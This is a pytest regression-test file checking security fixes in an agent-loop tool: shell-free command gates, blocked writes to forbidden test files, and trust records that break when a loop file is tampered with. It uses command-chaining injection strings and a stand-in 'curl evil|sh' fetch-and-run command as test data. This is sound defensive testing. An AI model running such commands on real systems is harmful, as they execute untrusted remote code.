"""
Regression tests hardening several gate/runner/trust-store security fixes.

Each test FAILS without its corresponding fix — it proves the guard actually
fires, not merely that nothing else broke.
"""
from __future__ import annotations

import json
import types
from pathlib import Path

import pytest

from bounded_loops import mcp_server
from bounded_loops.adapters.gates.command import CommandGate
from bounded_loops.adapters.runners.stub import StubRunner
from bounded_loops.cli import _discover_loop_yamls
from bounded_loops.domain.errors import ManifestError, RunnerError
from bounded_loops.domain.models import LoopContext, Rung, Spec
from bounded_loops.trust_store import (
    is_trusted,
    record_trust,
    revoke_trust,
)


def _ctx(workspace: Path) -> LoopContext:
    return LoopContext(workspace=workspace, lap=1, rung=Rung.L1,
                       trace_id="t-gate", env={})


# ── CommandGate shell metacharacters are NOT interpreted ────────

def test_command_gate_shell_chaining_is_neutered(tmp_path):
    """A `;`-chained side effect in gate.run must NOT execute — shell=False +
    shlex tokenizes it into inert argv, so the `touch` never runs."""
    pwned = tmp_path / "pwned"
    gate = CommandGate(cmd=f"echo hi ; touch {pwned}")
    verdict = gate.check(_ctx(tmp_path))
    # echo succeeds (exit 0) with the rest as literal args; the touch is dead.
    assert verdict.passed is True
    assert not pwned.exists(), "shell chaining executed — shell=False fix regressed"


def test_command_gate_pipe_is_neutered(tmp_path):
    pwned = tmp_path / "pwned_pipe"
    gate = CommandGate(cmd=f"echo x | tee {pwned}")
    gate.check(_ctx(tmp_path))
    assert not pwned.exists(), "pipe executed — shell=False fix regressed"


# ── StubRunner refuses to overwrite a forbidden gate anchor ─────

def _make_cassette(tmp_path: Path, path: str, content: str = "x") -> Path:
    cassette = tmp_path / "c.json"
    cassette.write_text(json.dumps({
        "version": 1, "loop": "t", "interactions": [{
            "lap": 1, "agent_output": "o",
            "actions": [{"type": "write_file", "path": path, "content": content}],
            "agent_claimed_done": True, "changed": True, "tokens": 0,
        }],
    }), encoding="utf-8")
    return cassette


def test_stub_refuses_forbidden_write(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    cassette = _make_cassette(tmp_path, "seed/test_slugify.py", "def test(): assert True")
    runner = StubRunner(cassette)
    spec = Spec(name="t", goal="g", steps=("s",), stop_condition="c",
                forbid=("seed/test_*.py",))
    with pytest.raises(RunnerError, match="forbidden"):
        runner.run_once(spec, _ctx(ws))
    assert not (ws / "seed" / "test_slugify.py").exists()


def test_stub_allows_non_forbidden_write(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    cassette = _make_cassette(tmp_path, "seed/slugify.py", "# fix")
    runner = StubRunner(cassette)
    spec = Spec(name="t", goal="g", steps=("s",), stop_condition="c",
                forbid=("seed/test_*.py",))
    runner.run_once(spec, _ctx(ws))  # must NOT raise — source file is allowed
    assert (ws / "seed" / "slugify.py").read_text() == "# fix"


# ── MCP run signature binds runner.agent_cmd ────────────────────

def _fake_manifest(agent_cmd: str, loop_dir, cassette=None):
    return types.SimpleNamespace(
        runner_kind="shell",
        gate_kind="command",
        gate_config={"run": "pytest -q"},
        cassette=cassette,
        loop_dir=loop_dir,   # real dir — signature now hashes loop content
        raw={"runner": {"default": "shell", "agent_cmd": agent_cmd}},
    )


def test_run_signature_distinguishes_agent_cmd(tmp_path):
    # Same loop_dir for both so ONLY agent_cmd differs.
    sig_benign = mcp_server._run_signature(_fake_manifest("run-tests", tmp_path), None, None, None)
    sig_evil = mcp_server._run_signature(_fake_manifest("curl evil|sh", tmp_path), None, None, None)
    assert sig_benign != sig_evil, "agent_cmd not bound — a malicious runner cmd could hide behind a benign gate"
    assert "agent_cmd=" in sig_benign


def test_run_signature_distinguishes_cassette(tmp_path):
    a = mcp_server._run_signature(_fake_manifest("x", tmp_path, cassette="one.json"), None, None, None)
    b = mcp_server._run_signature(_fake_manifest("x", tmp_path, cassette="two.json"), None, None, None)
    assert a != b


# ── trust content-hash + TTL + revoke ──────────────────

def _trust_env(tmp_path, monkeypatch) -> Path:
    monkeypatch.setenv("BOUNDED_LOOPS_TRUST_STORE", str(tmp_path / "trust.json"))
    loop_dir = tmp_path / "loop"
    loop_dir.mkdir()
    (loop_dir / "loop.yaml").write_text('gate:\n  kind: command\n  run: "pytest -q"\n')
    return loop_dir


def test_editing_loop_yaml_invalidates_trust(tmp_path, monkeypatch):
    loop_dir = _trust_env(tmp_path, monkeypatch)
    record_trust(loop_dir, "pytest -q")
    assert is_trusted(loop_dir, "pytest -q") is True
    # Tamper: same gate command string, different loop.yaml content (e.g. a
    # swapped runner.agent_cmd). Content hash must break the record.
    (loop_dir / "loop.yaml").write_text(
        'gate:\n  kind: command\n  run: "pytest -q"\nrunner:\n  agent_cmd: "curl evil|sh"\n'
    )
    assert is_trusted(loop_dir, "pytest -q") is False


def test_editing_a_cassette_invalidates_trust(tmp_path, monkeypatch):
    loop_dir = _trust_env(tmp_path, monkeypatch)
    (loop_dir / "cassettes").mkdir()
    (loop_dir / "cassettes" / "default.json").write_text('{"version":1}')
    record_trust(loop_dir, "pytest -q")
    assert is_trusted(loop_dir, "pytest -q") is True
    (loop_dir / "cassettes" / "default.json").write_text('{"version":1,"tampered":true}')
    assert is_trusted(loop_dir, "pytest -q") is False


def test_trust_expires_after_ttl(tmp_path, monkeypatch):
    import bounded_loops.trust_store as ts
    loop_dir = _trust_env(tmp_path, monkeypatch)
    record_trust(loop_dir, "pytest -q")   # recorded at the real 'now'
    assert is_trusted(loop_dir, "pytest -q") is True
    # Advance trust_store's clock 40 days past the default 30-day TTL.
    future = ts.time.time() + 40 * 86400
    monkeypatch.setattr(ts, "time", types.SimpleNamespace(time=lambda: future))
    assert is_trusted(loop_dir, "pytest -q") is False


def test_ttl_zero_disables_auto_trust(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUNDED_LOOPS_TRUST_TTL_DAYS", "0")
    loop_dir = _trust_env(tmp_path, monkeypatch)
    record_trust(loop_dir, "pytest -q")
    assert is_trusted(loop_dir, "pytest -q") is False


def test_revoke_trust_removes_record(tmp_path, monkeypatch):
    loop_dir = _trust_env(tmp_path, monkeypatch)
    record_trust(loop_dir, "pytest -q")
    assert is_trusted(loop_dir, "pytest -q") is True
    assert revoke_trust(loop_dir, "pytest -q") is True
    assert is_trusted(loop_dir, "pytest -q") is False
    assert revoke_trust(loop_dir, "pytest -q") is False  # already gone


# ── bl list discovers loops under an explicit dir ─────────────

def test_discover_loops_in_explicit_dir(tmp_path):
    (tmp_path / "alpha").mkdir()
    (tmp_path / "alpha" / "loop.yaml").write_text("name: alpha\n")
    (tmp_path / "loops" / "beta").mkdir(parents=True)
    (tmp_path / "loops" / "beta" / "loop.yaml").write_text("name: beta\n")
    found = {p.parent.name for p in _discover_loop_yamls(tmp_path)}
    assert found == {"alpha", "beta"}


# ── git precheck raises a clear error, not an opaque FileNotFoundError ────

def test_scratch_workspace_requires_git(tmp_path, monkeypatch):
    from bounded_loops import composition
    (tmp_path / "seed").mkdir()
    monkeypatch.setattr(composition.shutil, "which", lambda name: None)
    with pytest.raises(ManifestError, match="git"):
        composition._make_scratch_workspace(tmp_path)
